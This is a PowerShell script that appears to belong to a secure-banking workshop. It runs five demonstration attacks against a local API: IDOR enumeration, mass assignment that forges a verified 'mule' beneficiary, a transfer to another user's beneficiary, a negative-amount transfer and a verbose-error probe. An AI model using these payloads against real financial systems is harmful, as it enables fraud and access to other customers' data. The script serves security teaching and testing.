# Taller Banca Segura IA - ataques de demostracion (Windows PowerShell). SOLO contra localhost.
$Base = "http://localhost:8080"
$Auth = @{ Authorization = "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("ana:ana123")) }

function Invoke-Api($Method, $Path, $Body) {
    try {
        $params = @{ Method = $Method; Uri = "$Base$Path"; Headers = $Auth; ContentType = "application/json" }
        if ($Body) { $params.Body = $Body }
        $r = Invoke-WebRequest @params -UseBasicParsing
        "HTTP $($r.StatusCode) $($r.Content.Substring(0, [Math]::Min(200, $r.Content.Length)))"
    } catch {
        $resp = $_.Exception.Response
        if ($resp) {
            $reader = New-Object IO.StreamReader($resp.GetResponseStream())
            $txt = $reader.ReadToEnd()
            "HTTP $([int]$resp.StatusCode) $($txt.Substring(0, [Math]::Min(300, $txt.Length)))"
        } else { "ERROR $_" }
    }
}

"== 1) IDOR por enumeracion (88..95)"
88..95 | ForEach-Object { "id=$_ -> " + (Invoke-Api GET "/api/beneficiaries/$_") }

"`n== 2) Mass assignment"
Invoke-Api POST "/api/beneficiaries" '{"alias":"Mula","holderName":"Tercero","holderRut":"77777777-7","bankCode":"016","accountNumber":"000999888777","status":"VERIFIED","internalRiskScore":0,"customerId":2}'

"`n== 3) Transferencia a beneficiario ajeno (UUID valido de bruno)"
Invoke-Api POST "/api/transfers" '{"beneficiaryId":"7b2e9d14-6a3c-4f8e-b1d5-2c9a8e4f9102","amount":10000,"currency":"CLP"}'

"`n== 4) Monto negativo"
Invoke-Api POST "/api/transfers" '{"beneficiaryId":"3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001","amount":-50000,"currency":"CLP"}'

"`n== 5) Error verboso"
Invoke-Api GET "/api/beneficiaries/9999"

"`nRevise la consola de la aplicacion: que quedo registrado en los logs?"
